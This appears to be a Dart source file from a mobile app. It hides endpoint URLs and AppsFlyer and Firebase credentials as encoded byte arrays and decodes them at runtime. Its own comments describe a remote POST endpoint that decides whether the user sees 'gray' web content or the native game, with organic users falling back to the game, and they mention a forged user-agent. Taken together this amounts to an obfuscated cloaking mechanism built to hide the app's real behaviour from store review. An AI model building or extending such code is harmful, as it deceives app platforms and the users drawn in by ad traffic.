import '../crypt/obfuscator.dart';

// ============================================================
// SECURE STRINGS — encoded endpoints & credentials
// ============================================================
// Every value is a keystream-encoded byte list produced by
// tool/secret_packer.dart. Never store these as plaintext.
//
// After editing tool/secret_packer.dart (or the codec seed),
// re-run `dart run tool/secret_packer.dart` and replace the arrays.
//
// attributionKey / messagingProject stay empty until the manager
// supplies the AppsFlyer + Firebase credentials; resolvers return
// an empty string and the app degrades gracefully (organic → game).
// ============================================================

const List<int> _configEndpoint = <int>[
  0, 160, 118, 171, 90, 251, 82, 184, 145, 62, 141, 160, 14, 94, 135, 211,
  191, 244, 152, 110, 196, 151, 55, 49, 31, 161, 53, 160, 94, 183, 3, 230,
  173, 83, 172, 151, 55,
];

const List<int> _gcdBase = <int>[
  0, 160, 118, 171, 90, 251, 82, 184, 133, 54, 144, 164, 11, 71, 205, 198,
  160, 243, 142, 122, 218, 157, 124, 32, 94, 175, 117, 174, 30, 176, 11, 252,
  190, 28, 176, 147, 24, 96, 170, 251, 137, 148, 179, 16, 160, 236, 14,
];

const List<int> _chromeVersion = <int>[
  89, 230, 58, 245, 25, 239, 75, 161, 211, 102, 218, 230, 91, 26,
];

const List<int> _webkitVersion = <int>[93, 231, 53, 245, 26, 247];

const List<int> _attributionKey = <int>[
  34, 164, 74, 147, 104, 245, 55, 211, 152, 103, 174, 141, 86, 122, 213, 146,
  168, 183, 143, 100, 242, 176,
];

const List<int> _messagingProject = <int>[
  95, 231, 58, 234, 29, 248, 72, 160, 209, 109, 194, 238,
];

/// Full POST endpoint that decides web (gray) vs native (game).
String unlockConfigEndpoint() => rev(_configEndpoint);

/// AppsFlyer Dev Key (empty until provided).
String unlockAttributionKey() => rev(_attributionKey);

/// Firebase project number / sender id (empty until provided).
String unlockMessagingProject() => rev(_messagingProject);

/// Chrome major version fragment for the forged user-agent.
String unlockChromeVersion() => rev(_chromeVersion);

/// WebKit version fragment for the forged user-agent.
String unlockWebkitVersion() => rev(_webkitVersion);

/// Builds the GCD (Get Conversion Data) retry URL for the given identifiers.
String unlockGcdUrl(String appId, String deviceId) {
  final String base = rev(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${unlockAttributionKey()}&device_id=$deviceId';
}
